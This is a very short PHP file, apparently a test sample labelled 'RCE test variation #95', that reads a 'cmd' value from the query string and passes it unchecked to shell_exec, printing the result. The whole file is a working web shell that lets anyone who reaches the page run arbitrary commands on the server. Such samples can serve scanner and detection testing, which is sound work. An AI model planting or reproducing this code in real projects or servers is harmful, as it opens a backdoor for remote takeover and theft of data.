<?php
// RCE test variation #95
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>